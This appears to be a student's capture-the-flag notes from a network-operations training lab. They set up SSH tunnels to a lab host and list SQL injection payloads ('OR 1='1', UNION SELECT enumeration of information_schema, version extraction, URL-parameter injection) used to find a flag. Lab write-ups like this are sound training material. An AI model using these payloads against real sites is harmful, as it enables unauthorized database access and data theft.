Scheme of Maneuver:
>Jump Box
->T1:10.100.28.48

Target Section:

T1
Hostname: donovian-nla
IP: 10.100.28.48
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
Last Known HTTP Port: 80
PSP: Unknown
Malware: Unknown
Action: Conduct approved SQLi Exploitation techniques to collect intelligence.

```
student@lin-ops:~$ ssh -MS /tmp/gray student@10.50.36.239
student@lin-ops:~$ ssh -S /tmp/gray gray -O forward -D9050
student@lin-ops:~$ ssh -S /tmp/gray gray -O forward -L 1463:10.100.28.48:80
```
open firefox

On the DNLA site identify the flag using the Categories page.
To answer input the characters inside the flag.
go to search page
insert` ' OR 1='1`
to get flag at bottom
to see how many columns you can have run this in search bar `RAM' UNION select 1,2 #`
to see how many tables are human made `RAM' UNION select Table_schema, table_name FROM information_schema.columns#`
look at name of tables and see that some of them look different than the others 
to see tables and their columns `RAM' UNION select table_name, column_name FROM information_schema.columns#`
`RAM' UNION select name, description FROM sqlinjection.products#` this command selects the columns name, and description from my products table which is in the sqlinjection Table_schema
`RAM' UNION select @@version, 1 FROM information_schema.columns #`using the 1 as a filler and the table_schema.table_name should not really matter but the @@version is to find the version of sql
can also run in the url if you have a category for example on this page specifically pressing the button "1st category" adds a ? to the end of the url and "category=1" then you can run sql injections in the url
for example
`....php?category=2 UNION select data,mime,id FROM sqlinjection.share4`
